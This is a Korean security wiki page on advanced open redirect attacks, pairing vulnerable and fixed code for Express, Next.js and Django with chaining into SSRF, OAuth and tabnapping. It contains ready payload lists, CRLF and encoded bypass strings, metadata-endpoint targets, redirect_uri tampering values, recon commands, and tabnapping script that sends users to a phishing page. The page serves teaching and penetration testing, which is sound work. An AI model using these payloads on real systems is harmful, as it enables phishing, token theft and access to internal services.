---
title: Open Redirect 심화 (Open Redirect Deep Dive)
tags: [security, spring]
updated: 2026-07-27
---

# Open Redirect 심화

기본 원리는 [Open Redirect](Open_Redirect.md)에서 다뤘다. 여기서는 실제 침투테스트에서 마주치는 복합 공격 경로, 프레임워크 내부 동작이 만들어내는 취약점, URL 파서 간 불일치, 체이닝 시나리오를 다룬다.

---

## CRLF 인젝션과 Location 헤더 인젝션 연계

오픈 리다이렉트가 `Location` 헤더에 사용자 입력을 그대로 넣는 구조라면, CRLF(`\r\n`) 인젝션과 결합해 응답 헤더를 통째로 조작할 수 있다.

```http
GET /redirect?url=https://example.com%0d%0aSet-Cookie:+session=hacked HTTP/1.1
```

서버가 `url` 파라미터를 디코딩 없이 `Location`에 넣으면 응답은 다음이 된다.

```http
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: session=hacked
```

브라우저는 `Set-Cookie`를 정상적으로 처리한다. 공격자가 피해자 계정 세션을 심거나, `Content-Type`을 바꿔 XSS로 이어지는 페이로드를 주입할 수 있다.

실제로는 현대 프레임워크 대부분이 헤더 값에 `\r`·`\n`을 넣으면 예외를 던지거나 제거한다. Spring MVC는 `RedirectView`에서 CRLF를 제거하고, Node.js `http` 모듈은 헤더 이름과 값에 제어문자가 있으면 `ERR_INVALID_HTTP_TOKEN`을 던진다. 그러나 직접 응답 문자열을 조립하거나, 오래된 서블릿 컨테이너를 쓰거나, 프록시 레이어가 앞에 있어 헤더를 재조합하는 구조에서는 여전히 터진다.

```python
# 취약 패턴: 직접 write
response.write(b"HTTP/1.1 302 Found\r\nLocation: " + redirect_url.encode() + b"\r\n\r\n")
```

`url` 파라미터에 `https://example.com\r\nX-Injected: yes`를 넣으면 헤더가 추가된다. 프레임워크 응답 객체를 쓰지 않고 raw 소켓이나 BytesIO에 직접 쓰는 레거시 코드에서 흔히 나온다.

이중 인코딩으로 프레임워크 수준 필터를 우회하는 케이스도 있다.

```
%250d%250a  →  서버 1차 디코딩  →  %0d%0a  →  다음 레이어 디코딩  →  \r\n
```

미들웨어가 인코딩을 한 번만 해석하고 통과시키면, 다음 레이어에서 CRLF가 살아난다.

---

## SSRF 우회 수단으로서의 오픈 리다이렉트

SSRF 방어로 서버 사이드에서 아웃바운드 URL을 검증할 때, 허용 도메인 목록이나 IP 범위를 체크하는 방식을 쓴다. 이때 허용된 도메인에 오픈 리다이렉트가 있으면 우회 경로가 생긴다.

```
서버  →  허용된 URL fetch  →  302 Location: http://169.254.169.254/latest/meta-data/
```

SSRF 방어 로직이 최초 URL만 검증하고 리다이렉트를 따라가면 내부 주소에 도달한다. 이게 오픈 리다이렉트를 SSRF 체인에 쓰는 핵심이다.

```python
import requests

# SSRF 방어: 허용된 도메인만 fetch
allowed = {"api.trusted.com"}
url = user_input  # https://api.trusted.com/redirect?url=http://169.254.169.254/
parsed = urllib.parse.urlparse(url)
if parsed.hostname not in allowed:
    raise ValueError("Blocked")

# 통과 후 실제 요청 — allow_redirects=True가 기본값
resp = requests.get(url)  # 302 → 169.254.169.254 로 따라감
```

`requests` 라이브러리는 `allow_redirects=True`가 기본이다. 리다이렉트를 따라갈 때 새 URL에 대한 검증은 없다. 방어 측에서는 리다이렉트를 따라갈 때마다 목적지 URL을 다시 검증해야 한다.

```python
def safe_fetch(url):
    resp = requests.get(url, allow_redirects=False)
    if resp.status_code in (301, 302, 303, 307, 308):
        next_url = resp.headers.get("Location", "")
        if not is_allowed(next_url):  # 리다이렉트 대상도 검증
            raise ValueError("Redirect to blocked URL")
        return safe_fetch(next_url)  # 재귀적으로 검증
    return resp
```

실제 버그바운티에서 자주 보이는 흐름이다. Webhook 처리, 이미지 프록시, URL 미리보기 기능이 대표적인 발생 지점이다. AWS EC2 메타데이터(`169.254.169.254`), GCP 메타데이터(`metadata.google.internal`), 내부 admin 포트가 주요 타깃이다.

---

## Tabnapping: window.opener 조작

클라이언트 사이드 오픈 리다이렉트와 `window.opener`가 만나는 케이스다. `target="_blank"` 링크로 새 탭을 열면, 열린 탭에서 `window.opener`로 부모 탭을 참조할 수 있다.

```html
<!-- 오픈 리다이렉트 페이지를 _blank로 열면 -->
<a href="https://example.com/redirect?url=https://evil.com" target="_blank">클릭</a>
```

사용자가 클릭하면 `evil.com`이 새 탭에 로드된다. `evil.com`은 이렇게 부모 탭을 조작한다.

```javascript
// evil.com에서 실행
if (window.opener) {
  window.opener.location.href = "https://evil-phishing.com/login";
}
```

사용자가 새 탭을 보는 사이 부모 탭이 가짜 로그인 페이지로 바뀐다. 새 탭을 닫고 원래 탭으로 돌아오면 로그인 화면이 뜬다. 아까 로그인했던 사이트라 의심 없이 자격 증명을 입력한다.

브라우저 최신 버전은 `target="_blank"` 링크에 기본으로 `rel="noopener"`를 적용해 `window.opener`를 `null`로 만든다. Chrome 88+, Firefox 79+, Safari 12.1+부터 기본 동작이 바뀌었다. 그러나 오래된 브라우저 환경이나, 직접 `window.open()`을 호출하는 JavaScript 코드에서는 여전히 열려있다.

```javascript
// 직접 window.open 호출 — noopener 미설정
window.open(redirectUrl, '_blank');  // opener 관계 유지됨

// 안전하게
window.open(redirectUrl, '_blank', 'noopener,noreferrer');
```

서버 사이드 리다이렉트는 이 공격에 해당하지 않는다. 클라이언트가 `window.open`으로 URL을 열거나, `<a target="_blank">` 앵커를 제어할 수 있는 경우에만 적용된다.

---

## Unicode 호모그래프와 IDNA 정규화 우회

시각적으로 동일해 보이지만 코드포인트가 다른 문자(호모그래프)로 도메인을 만들면, 사람 눈에는 `example.com`처럼 보이지만 실제로는 다른 도메인이다.

```
example.com  →  실제 도메인
еxample.com  →  'e' 대신 키릴 문자 'е' (U+0435) 사용
```

브라우저 주소창에서는 퓨니코드로 표시되지만(`xn--xample-9ua.com`), URL 파라미터로 들어올 때는 유니코드 형태로 들어올 수 있다. 서버의 허용 목록이 ASCII `example.com`만 가지고 있고, 들어온 값을 IDNA 정규화 없이 비교하면 통과된다.

IDNA(Internationalized Domain Names in Applications) 정규화를 거치면 다음과 같다.

```python
import idna

# 키릴 'е' 가 포함된 도메인
malicious = "еxample.com"  # U+0435

try:
    punycode = idna.encode(malicious).decode()
    print(punycode)  # xn--xample-9ua.com
except idna.core.InvalidCodepoint:
    print("Invalid domain")
```

허용 도메인 비교 시 들어온 값을 IDNA 인코딩한 뒤 허용 목록과 비교해야 한다. 둘 다 같은 정규화 단계를 거쳐야 `еxample.com`과 `example.com`이 다르다고 판별된다.

Java에서는 `java.net.IDN.toASCII(host)`를 쓰고, Python에서는 `idna` 라이브러리나 `host.encode('idna').decode()`를 쓴다. `str.lower()`만으로는 부족하다.

또 하나 주의할 지점은 점(`.`) 변형이다. 풀 스탑(`.`, U+002E) 외에도 유사 문자가 있다.

```
。  U+3002  IDEOGRAPHIC FULL STOP
．  U+FF0E  FULLWIDTH FULL STOP
｡  U+FF61  HALFWIDTH IDEOGRAPHIC FULL STOP
```

IDNA 처리 라이브러리가 이 문자들을 점으로 정규화하면 서브도메인 구조가 달라질 수 있다. 라이브러리마다 처리 방식이 다르다.

---

## IPv6·IPv4 표기 우회

IP 주소 기반 허용/차단 로직은 표기 다양성 때문에 뚫리기 쉽다.

### IPv4 변형

```
http://192.168.1.1          표준 표기
http://3232235777           10진수 1개 (0xC0A80101 = 3232235777)
http://0xC0A80101           16진수
http://0300.0250.0001.0001  8진수
http://192.168.0x01.01      혼합
http://192.168.1.1.         끝에 점 추가 (일부 파서)
```

curl, requests, 브라우저는 이런 변형을 대부분 `192.168.1.1`로 해석한다. 서버 검증이 표준 점 구분 표기만 체크하면 나머지 형식은 통과한다.

```python
# 취약: 문자열 매칭
blocked_ips = {"192.168.1.1", "127.0.0.1"}
if parsed.hostname in blocked_ips:
    raise ValueError("Blocked")
# 0x7f000001 이 들어오면 통과

# 안전: socket.inet_aton 또는 ipaddress 모듈로 정규화
import ipaddress
try:
    ip = ipaddress.ip_address(parsed.hostname)
    if ip.is_private or ip.is_loopback:
        raise ValueError("Blocked")
except ValueError:
    pass  # 도메인이면 정규화 실패, 별도 처리
```

### IPv6 변형

```
http://[::1]                루프백
http://[0:0:0:0:0:0:0:1]    전체 표기
http://[::ffff:192.168.1.1] IPv4-mapped IPv6
http://[::ffff:7f00:1]      16진수 IPv4-mapped
http://[2001:db8::1]%25eth0  zone ID
```

IPv4-mapped IPv6 주소(`::ffff:192.168.1.1`)는 IPv4 `192.168.1.1`과 동일하다. IPv4만 막고 IPv6를 빠뜨리면 이 형식으로 우회된다. 일부 파서는 `[` `]`를 벗겨낸 뒤 정규화하지 않아 zone ID(`%25eth0`)도 처리 못한다.

```typescript
import { isIPv4, isIPv6 } from 'net';
import * as ipaddr from 'ipaddr.js'; // npm install ipaddr.js

// Node.js에서 IPv4-mapped IPv6 정규화
const addr = ipaddr.parse('::ffff:192.168.1.1');
if (addr.kind() === 'ipv6') {
  const v6 = addr as ipaddr.IPv6;
  if (v6.isIPv4MappedAddress()) {
    const v4 = v6.toIPv4Address();
    console.log(v4.toString()); // "192.168.1.1"
    // 정규화된 IPv4 주소로 private/loopback 여부 확인
    console.log(v4.range()); // "private" | "loopback" | "unicast" ...
  }
}
```

---

## 프레임워크별 내부 동작 차이

### Express / NestJS 로그인 후 리다이렉트

Express 기반 앱에서 세션에 원래 요청 URL을 저장하고, 로그인 성공 후 거기로 돌려보내는 패턴이 있다. 이때 저장된 URL을 검증 없이 그대로 쓰면 오픈 리다이렉트가 된다.

```typescript
// 취약: session에 저장된 returnTo를 검증 없이 사용
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (authenticate(username, password)) {
    const returnTo = req.session.returnTo ?? '/';
    delete req.session.returnTo;
    res.redirect(returnTo);  // returnTo가 외부 URL이면 그대로 나감
  }
});
```

더 자주 나오는 문제는 쿼리 파라미터 `returnUrl`을 직접 읽어 검증 없이 리다이렉트하는 경우다.

```typescript
// 취약: returnUrl 파라미터 검증 없음
app.post('/login', (req, res) => {
  const returnUrl = req.query.returnUrl as string;
  if (returnUrl) {
    res.redirect(returnUrl);  // 절대 URL이면 외부 도메인으로 나감
  }
});
```

Express에서 안전하게 처리하려면 경로 여부를 확인하고, `//`나 `\`로 시작하는 프로토콜 상대 URL도 차단한다.

```typescript
function safeReturnUrl(returnUrl: string | undefined): string {
  if (!returnUrl) return '/';
  // 상대 경로만 허용: /로 시작, //나 \로 시작하지 않아야 함
  if (returnUrl.startsWith('/') && !returnUrl.startsWith('//') && !returnUrl.includes('\\')) {
    return returnUrl;
  }
  return '/';
}

app.post('/login', (req, res) => {
  const returnUrl = safeReturnUrl(req.query.returnUrl as string);
  res.redirect(returnUrl);
});
```

### Next.js redirect()

Next.js 13+ App Router에서 `redirect()`는 서버 컴포넌트와 Server Action 내에서 동작한다.

```typescript
// app/login/actions.ts
"use server";
import { redirect } from "next/navigation";

export async function loginAction(formData: FormData) {
  const returnUrl = formData.get("returnUrl") as string;
  // ... 로그인 처리
  redirect(returnUrl);  // 취약: returnUrl이 외부 URL이면 외부로 나감
}
```

`redirect()`는 내부적으로 `NEXT_REDIRECT` 예외를 던지고, Next.js 런타임이 이를 잡아 `302` 또는 `307` 응답으로 변환한다. 절대 URL을 넣으면 그대로 외부로 나간다.

Pages Router의 `res.redirect()`도 같다.

```typescript
// pages/api/login.ts
export default function handler(req, res) {
  const returnUrl = req.query.returnUrl;
  res.redirect(returnUrl);  // 취약
}
```

Next.js 13+ 기준 `redirect()` 자체에는 URL 검증이 내장돼 있지 않다. 검증은 애플리케이션 코드에서 해야 한다.

```typescript
function safeRedirectUrl(returnUrl: string | null): string {
  if (!returnUrl) return "/";
  try {
    const url = new URL(returnUrl, "https://app.example.com");
    if (url.host !== "app.example.com") return "/";
    return url.pathname + url.search;
  } catch {
    return "/";
  }
}
```

`new URL(returnUrl, base)`로 파싱하면 상대 경로도 절대 URL로 해석된다. 파싱 후 호스트가 자기 도메인인지 확인하고, 경로만 추출해서 리다이렉트한다.

### Django HttpResponseRedirect

Django는 `HttpResponseRedirect`가 URL을 거의 검증하지 않는다.

```python
from django.http import HttpResponseRedirect

def login_success(request):
    next_url = request.GET.get("next", "/")
    return HttpResponseRedirect(next_url)  # 외부 URL 그대로 통과
```

Django에는 `is_safe_url()` (Django 3.x 이전) 또는 `url_has_allowed_host_and_scheme()` (Django 3.x+) 유틸리티가 있다.

```python
from django.utils.http import url_has_allowed_host_and_scheme

def login_success(request):
    next_url = request.GET.get("next", "/")
    allowed_hosts = {request.get_host()}
    if url_has_allowed_host_and_scheme(
        url=next_url,
        allowed_hosts=allowed_hosts,
        require_https=request.is_secure(),
    ):
        return HttpResponseRedirect(next_url)
    return HttpResponseRedirect("/")
```

이 함수 내부를 보면 `//evil.com`, `\evil.com`, 프로토콜 상대 URL을 차단한다. 단, 허용 호스트 목록을 `None`으로 넘기면 같은 호스트가 아닌 것도 통과하니, 반드시 `allowed_hosts`를 채워야 한다.

주의할 점은 `request.get_host()`가 `HOST` 헤더를 그대로 읽는다는 것이다. `ALLOWED_HOSTS` 설정이 없으면 헤더 스푸핑으로 허용 목록 자체를 조작할 수 있다. `settings.ALLOWED_HOSTS`를 항상 채워두는 이유가 여기 있다.

---

## 리버스 프록시·CDN 레이어 파싱 불일치

Nginx, Cloudflare, AWS ALB 같은 프록시 레이어가 앞에 있으면 URL 파싱이 두 단계로 나뉜다. 프록시가 파싱한 URL과 백엔드가 파싱한 URL이 다르면 검증 우회가 생긴다.

```
클라이언트  →  Nginx  →  Spring Boot

GET /redirect?url=https://example.com%2f%2fevil.com HTTP/1.1
```

Nginx가 `%2f`를 `/`로 디코딩하면 백엔드에는 `https://example.com//evil.com`이 도착한다. Spring Boot의 URL 파서가 `//evil.com`을 경로로 보는지, 프로토콜 상대로 보는지에 따라 동작이 달라진다.

더 자주 문제가 되는 건 경로 정규화다.

```
GET /app/redirect?url=/private/../admin HTTP/1.1
```

Nginx가 경로를 정규화하면 `/app/admin`으로 바꿀 수 있지만, 설정에 따라 그대로 백엔드에 전달하기도 한다. 백엔드에서 path traversal 검사를 안 하면 내부 경로로 가는 리다이렉트가 만들어진다.

`X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` 같은 헤더를 백엔드가 신뢰하도록 설정돼 있으면, 프록시를 우회한 직접 요청에서 이 헤더를 조작해 리다이렉트 대상을 바꿀 수 있다.

```http
GET /redirect HTTP/1.1
Host: app.example.com
X-Forwarded-Host: evil.com
```

백엔드가 `X-Forwarded-Host`를 허용 호스트 판단에 쓰면, 리다이렉트 대상이 `evil.com`이 된다. 이런 헤더는 신뢰할 수 있는 프록시에서만 수신하도록 방화벽으로 제한해야 한다.

---

## 서브도메인 탈취와 오픈 리다이렉트 체이닝

OAuth 허용 redirect_uri에 서브도메인 와일드카드(`*.example.com`)를 쓰는 서비스에서 서브도메인 중 하나를 탈취하면, 그 서브도메인을 통해 인가 코드·토큰을 가로챌 수 있다.

서브도메인 탈취 경로:

1. `old-feature.example.com`이 CNAME으로 `someservice.example.com.s3.amazonaws.com`을 가리키는데, 실제 S3 버킷은 삭제된 상태.
2. 공격자가 같은 이름의 S3 버킷을 생성 → `old-feature.example.com` 요청이 공격자 버킷으로 간다.
3. 인가 서버가 `redirect_uri=https://old-feature.example.com/callback`을 허용하면, 그리로 인가 코드가 날아온다.

```
[공격 흐름]
1. DNS: old-feature.example.com CNAME → dangling S3 버킷
2. 공격자가 S3 버킷 점유
3. 피해자 링크: https://auth.example.com/authorize?redirect_uri=https://old-feature.example.com/callback
4. 로그인 완료 → code가 공격자 S3 버킷으로 전달
```

오픈 리다이렉트와 결합하면 서브도메인 탈취 없이도 비슷한 효과가 난다. 허용된 서브도메인에 오픈 리다이렉트가 있으면:

```
redirect_uri=https://app.example.com/redirect?url=https://evil.com

→ 인가 서버: app.example.com 허용됨, 통과
→ app.example.com/redirect: url=https://evil.com 으로 리다이렉트
→ code=xxx 가 evil.com 에 도착 (Referer 헤더 또는 URL로)
```

Referer 헤더로 인가 코드가 유출되는 건 `code`가 URL 파라미터에 붙어 있고, `evil.com`에 외부 리소스(이미지, 스크립트)가 있을 때 발생한다.

---

## 실무 침투테스트 접근법

### 리다이렉트 파라미터 수집

Burp Suite Proxy로 전체 트래픽을 보면서 `redirect`, `next`, `returnUrl`, `url`, `dest`, `continue`, `goto`, `target`, `to`, `go`, `return`, `returnTo`, `ref`, `link`, `out`가 포함된 요청을 뽑는다.

```bash
# katana로 크롤링하면서 redirect 관련 파라미터 수집
katana -u https://target.com -f qurl | grep -iE "[?&](redirect|next|url|return|dest|goto|to|ref)"

# gau로 과거 URL 수집
gau target.com | grep -iE "[?&](redirect|next|url|return|dest)"
```

### 기본 페이로드 목록

```
https://evil.com
//evil.com
\/\/evil.com
/\evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
https://target.com.evil.com
https://evil.com@target.com
https://target.com%40evil.com
https://evil.com%2f@target.com
https://target.com/redirect?url=https://evil.com
%0d%0aLocation:%20https://evil.com
https://еvil.com  (키릴 е)
http://0x7f000001
http://127.1
http://2130706433  (127.0.0.1 10진수)
http://[::1]
http://[::ffff:127.0.0.1]
```

### 검증 로직 분석 포인트

실제 테스트할 때 보는 순서다.

파라미터가 있으면 `https://evil.com`부터 넣어보고 리다이렉트 여부를 확인한다. 막혀있으면 `//evil.com`, `/\evil.com` 순서로 우회를 시도한다. 화이트리스트가 있어 보이면 `target.com.evil.com`, `evil.com/target.com`, `target.com@evil.com`으로 부분 매칭 우회를 시도한다. 인코딩 처리가 있으면 `%2f%2fevil.com`, `%252f%252fevil.com` (이중 인코딩), 퍼센트 인코딩된 프로토콜 `%68%74%74%70%73%3a%2f%2fevil.com`도 넣어본다.

Burp Intruder에서 파라미터 값을 리스트 기반으로 퍼징할 때, 응답 `Location` 헤더 값을 비교 기준으로 설정하면 어떤 페이로드가 실제 리다이렉트를 만드는지 빠르게 찾을 수 있다.

### OAuth 흐름 검증

`redirect_uri`를 조작할 때는 인가 서버가 원본과 다른 값을 어떻게 처리하는지 본다.

```
# 원본
redirect_uri=https://app.example.com/callback

# 테스트 변형
redirect_uri=https://app.example.com.evil.com/callback
redirect_uri=https://app.example.com/callback/../../../redirect?url=https://evil.com
redirect_uri=https://app.example.com/callback%2f..%2f..%2fredirect%3furl%3dhttps://evil.com
redirect_uri=https://evil.com
redirect_uri=https://app.example.com/callback/anything  (경로 접미사 허용 여부)
```

응답이 `invalid_redirect_uri`면 정확히 검증한다는 뜻이다. 그냥 리다이렉트가 가면 파싱 불일치나 부분 매칭이 있다는 뜻이다.

### 영향 보고 시 주의사항

오픈 리다이렉트를 단독으로 보고할 때는 영향 범위를 구체적으로 써야 한다. "피싱에 악용 가능"만 쓰면 낮은 등급을 받는다. 실제로 어떤 자격 증명이나 토큰이 유출되는지, 다른 취약점(SSRF, OAuth)과 결합해서 어떤 피해가 발생하는지 체인을 명확히 보여줘야 중간 이상 등급을 받는다.

세션 쿠키가 `HttpOnly`가 아니면 `document.cookie`를 XSS로 탈취하는 체인도 연결할 수 있다. 로그인 직후 리다이렉트에 있으면 피싱 신뢰도가 높아져 영향 등급이 올라간다.
